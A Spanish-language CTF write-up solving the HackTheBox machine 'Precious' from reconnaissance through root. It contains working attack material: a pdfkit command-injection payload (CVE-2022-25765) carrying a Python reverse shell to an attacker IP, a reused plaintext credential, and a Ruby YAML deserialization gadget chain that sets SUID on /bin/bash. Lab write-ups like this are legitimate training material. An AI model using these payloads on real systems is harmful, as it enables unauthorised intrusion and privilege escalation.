---
title: Precious Writeup - HackTheBox
date: 2023-04-17
categories: [Writeups, HTB]
tags: [Linux, HTB, CTF, Easy, CVE-2022-25765, SUDO, Ruby, Deserialization]
img_path: /assets/img/commons/precious/
image: precious.png
---

¡Hola!

En este writeup vamos a explorar la máquina [**Precious**](https://app.hackthebox.com/machines/513) de **HackTheBox**, que se clasifica como de dificultad fácil en la plataforma. Durante este desafío, llevaremos a cabo una enumeración web para descubrir un CVE relacionado con una aplicación utilizada en la web. Una vez que explotemos esta vulnerabilidad, escalaremos privilegios aprovechando los permisos de SUDO y una vulnerabilidad de deserialización Ruby.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.11.189
PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=107 ms

--- 10.10.11.189 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 107.249/107.249/107.249/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.11.189 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 19:06 -05
Nmap scan report for 10.10.11.189
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.18 seconds
```

Vemos que únicamente tenemos dos puertos habilitados, `HTTP (80)` y `SSH (22)`.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,80 -sV -sC --min-rate 5000 10.10.11.189 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 19:08 -05
Nmap scan report for 10.10.11.189
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.84 seconds
```

El resultado obtenido muestra las versiones de los servicios correspondientes. Asimismo, podemos observar en las cabeceras HTTP que se está intentando redirigir a `http://precious.htb/`.

### HTTP - 80

Después de explorar el servicio web, hemos obtenido la siguiente información:

![web](web.png)

Observamos que se está intentando redireccionar al dominio `precious.htb`. Para que la traducción del nombre de dominio se realice correctamente, debemos introducir el dominio y la dirección IP de la máquina víctima en el archivo `/etc/hosts`.

```bash
❯ echo '10.10.11.189\tprecious.htb' >> /etc/hosts
```

Después de recargar el sitio web, parece que estamos ante una página web que convierte páginas web a PDF.

![domain](domain.png)

Si intentamos convertir una página web externa, obtenemos el siguiente error:

![error](error.png)

El mensaje indica que no se puede cargar la URL remota. Por lo tanto, se puede crear un servidor web simple utilizando Python en la misma red local para realizar pruebas y observar el comportamiento.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Volvemos a introducir nuestro servidor HTTP local y ahora veremos cómo realiza correctamente la conversión de la página web.

![pdf](pdf.png)

Si capturamos la petición con **Burp Suite** para identificar cómo se procesa, podemos observar en la respuesta que el software y la versión utilizados para convertir la página web a formato PDF es `pdfkit v0.8.6`.

![burpsuite](burpsuite.png)

## Análisis de vulnerabilidades

---

Una vez identificada la versión del software, procedemos a realizar una evaluación de vulnerabilidades con el fin de detectar posibles fallos que nos permitan acceder al servidor. Al llevar a cabo una búsqueda rápida en Google, utilizando términos clave relacionados con vulnerabilidades conocidas, identificamos el **CVE-2022-25765**. Este reporte nos indica que la versión de `pdfkit` utilizada es vulnerable a inyecciones de comandos. Para obtener más información detallada sobre este CVE, puede consultar el siguiente enlace: [security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869](http://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869).

El CVE nos dice que una aplicación podría ser vulnerable si intenta representar una URL que contenga parámetros de cadena de consulta con la entrada del usuario. Si el parámetro proporcionado contiene un carácter codificado en URL y una cadena de sustitución de comandos de shell, se incluirá en el comando que `PDFKit` ejecuta para representar el PDF.

## Explotación

---

### **CVE-2022-25765**

Bajo este contexto, intentamos ejecutar el comando "id" con el siguiente payload.

```bash
http://10.10.14.6/?name=%20`id`
```

Como vemos tenemos éxito y podemos confirmar la vulnerabilidad.

![id](id.png)

Ahora podemos establecer una reverse shell directamente, indicando la dirección IP de la máquina atacante y el puerto de escucha correspondiente. En este caso, utilizaremos el lenguaje de programación Python.

```bash
http://10.10.14.6/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
```

Antes de recibir una conexión, es necesario que estemos escuchando en el puerto especificado. 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.189] 32984
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

En este punto podemos realizar un **tratamiento de la TTY** para tener una shell inversa más interactiva y funcional. Para ello seguimos los siguientes pasos descritos en: [Tratamiento de la TTY](https://itzjp-sec.github.io/posts/tratamiento-tty/).

### Horizontal User Pivoting

Observamos que estamos utilizando el usuario `ruby`. Al revisar los usuarios del sistema, podemos confirmar que `henry` es el usuario principal del sistema. Por lo tanto, debemos buscar un método para escalar nuestros privilegios y acceder a dicho usuario.

```bash
ruby@precious:/var/www/pdfapp$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
henry:x:1000:1000:henry,,,:/home/henry:/bin/bash
ruby:x:1001:1001::/home/ruby:/bin/bash
```

Si accedemos al directorio de `henry`, encontramos la primera bandera, sin embargo, desafortunadamente no contamos con los permisos necesarios para leerla.

```bash
ruby@precious:/home/henry$ ls
user.txt
ruby@precious:/home/henry$ cat user.txt 
cat: user.txt: Permission denied
```

Al listar los archivos y directorios ocultos del directorio del usuario actual, encontramos el directorio `.bundle`. Al acceder al mismo, encontramos la contraseña del usuario `henry`.

```bash
ruby@precious:~$ ls -al
total 32
drwxr-xr-x 5 ruby ruby 4096 Apr 17 22:53 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Apr 17 22:18 .cache
drwxr-xr-x 3 ruby ruby 4096 Apr 17 22:53 .local
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ cd .bundle/
ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Las credenciales proporcionadas nos permiten cambiar al usuario `henry` dentro del sistema o bien acceder a través de SSH.

```bash
ruby@precious:~/.bundle$ su henry
Password: 
henry@precious:/home/ruby/.bundle$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
```

A continuación ya podemos leer la primera flag.

```bash
henry@precious:/home/ruby/.bundle$ cd
henry@precious:~$ cat user.txt 
e08a6a67995bb90a****************
```

## Escalación de privilegios

---

### Abuso de archivo Ruby con permisos SUDO

Nuestro objetivo actual es elevar los privilegios de usuario a `root`. Para lograrlo, empezamos por listar los permisos de los binarios que el usuario puede ejecutar con sudo.

```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Al parecer, el usuario `henry` puede ejecutar el archivo `update_dependencies.rb` con permisos de `root` sin necesidad de una contraseña.

### Deserialización Ruby 

Usamos `cat` para ver el contenido del archivo:

```bash
henry@precious:~$ cat /opt/update_dependencies.rb 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

Al revisar el código, vemos que usa `YAML.load`, que es vulnerable al ataque de deserialización. Puede leer más sobre los ataques de deserialización de YAML aquí:

- [https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure Deserialization/Ruby.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)

Para que la ejecución de nuestro código sea exitosa, es necesario crear una carga útil en un archivo YAML denominado `dependencias.yml`. Utilizando las referencias proporcionadas, creamos un archivo con el siguiente contenido que nos permitirá ejecutar el comando `id`:

```bash
henry@precious:~$ cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

Ejecutamos el binario con el comando `sudo` desde el directorio donde se ubica nuestro archivo `dependencias.yml`.

```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
	33: from /opt/update_dependencies.rb:17:in `<main>'
	32: from /opt/update_dependencies.rb:10:in `list_from_file'
	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
	19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
	18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
	14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
	13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
	12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
	11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
	10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
	9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
	8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
	7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
	6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
	5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
	3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
	2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

¡Nuestra ejecución de código funcionó! Ahora veamos si podemos cambiar los permisos del binario `/bin/bash` para que podamos elevar nuestros privilegios. 

Editamos nuevamente el archivo `dependencies.yml` para asignar permisos **SUID** al binario `/bin/bash`:

```bash
henry@precious:~$ cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```

Ejecutamos nuevamente `update_dependencies.rb` y verificamos si se han realizado los cambios correspondientes.

```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
	33: from /opt/update_dependencies.rb:17:in `<main>'
	32: from /opt/update_dependencies.rb:10:in `list_from_file'
	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
	19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
	18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
	14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
	13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
	12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
	11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
	10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
	9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
	8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
	7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
	6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
	5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
	3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
	2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
henry@precious:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Se puede verificar que los cambios de los permisos `SUID` se realizaron correctamente en el binario `/bin/bash`, lo que nos permite generar una bash con privilegios de `root`.

```bash
henry@precious:~$ /bin/bash -p
bash-5.1# whoami
root
```

Finalmente, leemos la bandera del usuario `root` en el directorio habitual.

```bash
bash-5.1# cd /root/
bash-5.1# ls
root.txt
bash-5.1# cat root.txt 
3b847b47c2c6d164****************
```

¡Happy Hacking!
